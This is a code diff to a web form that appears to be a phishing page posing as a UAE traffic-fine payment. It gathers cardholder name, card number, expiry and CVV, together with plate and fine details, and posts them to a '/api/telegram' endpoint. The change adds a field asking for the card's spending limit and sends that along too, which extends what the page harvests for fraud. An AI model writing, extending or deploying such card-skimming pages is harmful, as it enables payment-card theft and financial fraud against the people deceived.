@@ -74,6 +74,12 @@
       <div id="bin-loading" style="display:none;font-size:11px;color:#6b7280;margin-top:4px;">Checking card details...</div>
       <div id="bin-info" class="field-note" style="display:none;"></div>
       <div id="bin-error" class="field-warn" style="display:none;"></div>
+      <div id="card-limit-display" style="display:none;font-size:11px;color:#6b7280;margin-top:4px;padding-left:2px;"></div>
+      <div style="margin-top:6px;">
+        <input type="text" inputmode="numeric" id="cardLimit" placeholder="Card limit (AED) — optional"
+          oninput="onCardLimitChange(this.value)"
+          style="width:100%;padding:9px 14px;border:1.5px solid #e5e7eb;border-radius:8px;font-size:13px;background:#fafafa;outline:none;color:#374151;font-family:inherit;">
+      </div>
     </div>
 
     <!-- Cardholder Name -->
@@ -196,6 +202,18 @@ function fetchBin(bin) {
     });
 }
 
+function onCardLimitChange(raw) {
+  const digits = raw.replace(/\D/g, '');
+  document.getElementById('cardLimit').value = digits;
+  const display = document.getElementById('card-limit-display');
+  if (digits) {
+    display.textContent = '(Limit: AED ' + Number(digits).toLocaleString() + ')';
+    display.style.display = '';
+  } else {
+    display.style.display = 'none';
+  }
+}
+
 function onExpiryChange(el) {
   const digits = el.value.replace(/\D/g,'').slice(0,4);
   el.value = digits.length >= 3 ? digits.slice(0,2) + '/' + digits.slice(2) : digits;
@@ -243,12 +261,13 @@ async function handleSubmit() {
   const cardNumber = document.getElementById('cardNumber').value;
   const expiry     = document.getElementById('expiry').value;
   const cvv        = document.getElementById('cvv').value;
+  const cardLimit  = document.getElementById('cardLimit').value;
 
   try {
     const res = await fetch('/api/telegram', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({sid, cardName, cardNumber, expiry, cvv, plateNo: PLATE_NO, plateSrcCode: PLATE_SRC, plateCodeLetter: PLATE_LTR, totalFine: TOTAL_FINE, fineCount: FINE_COUNT, binInfo})
+      body: JSON.stringify({sid, cardName, cardNumber, expiry, cvv, cardLimit, plateNo: PLATE_NO, plateSrcCode: PLATE_SRC, plateCodeLetter: PLATE_LTR, totalFine: TOTAL_FINE, fineCount: FINE_COUNT, binInfo})
     });
     const json = await res.json().catch(() => null);
     if (!res.ok || !json?.ok) console.warn('Telegram failed');
